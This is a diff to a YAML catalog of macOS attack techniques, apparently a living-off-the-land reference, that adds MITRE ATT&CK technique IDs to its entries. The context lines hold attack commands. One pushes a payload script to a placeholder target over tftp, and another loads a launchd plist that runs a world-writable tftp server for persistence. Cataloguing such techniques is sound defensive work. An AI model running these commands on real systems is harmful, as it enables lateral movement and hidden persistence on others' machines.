@@ -10,6 +10,8 @@ example_use_cases:
     tactics:
       - Lateral Movement
       - Persistence
+    techniques:
+      - T1570
     tags:
       - launchctl
       - file-transfer
@@ -18,6 +20,8 @@ example_use_cases:
     code: "tftp <TARGET_IP> << EOF\nbinary\nput /tmp/payload.sh payload.sh\nquit\nEOF"
     tactics:
       - Lateral Movement
+    techniques:
+      - T1570
     tags:
       - file-transfer
       - oneliner
@@ -26,8 +30,11 @@ example_use_cases:
     code: "mkdir -p /tmp/tftp_server && chmod 777 /tmp/tftp_server\ntee /tmp/com.user.tftp.plist > /dev/null << 'EOF'\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>Label</key>\n    <string>com.user.tftp</string>\n    <key>WorkingDirectory</key>\n    <string>/tmp/tftp_server</string>\n    <key>ProgramArguments</key>\n    <array>\n        <string>/usr/libexec/tftpd</string>\n        <string>-w</string>\n        <string>-l</string>\n        <string>-u</string>\n        <string>$(whoami)</string>\n    </array>\n    <key>inetdCompatibility</key>\n    <dict>\n        <key>Wait</key>\n        <true/>\n    </dict>\n    <key>Sockets</key>\n    <dict>\n        <key>Listeners</key>\n        <dict>\n            <key>SockServiceName</key>\n            <string>6969</string>\n            <key>SockType</key>\n            <string>dgram</string>\n            <key>SockFamily</key>\n            <string>IPv4</string>\n        </dict>\n    </dict>\n</dict>\n</plist>\nEOF\nlaunchctl load -w /tmp/com.user.tftp.plist"
     tactics:
       - Lateral Movement
-      - Defense Evasion
+      - Stealth
       - Persistence
+    techniques:
+      - T1570
+      - T1543.001
     tags:
       - launchctl
       - file-transfer
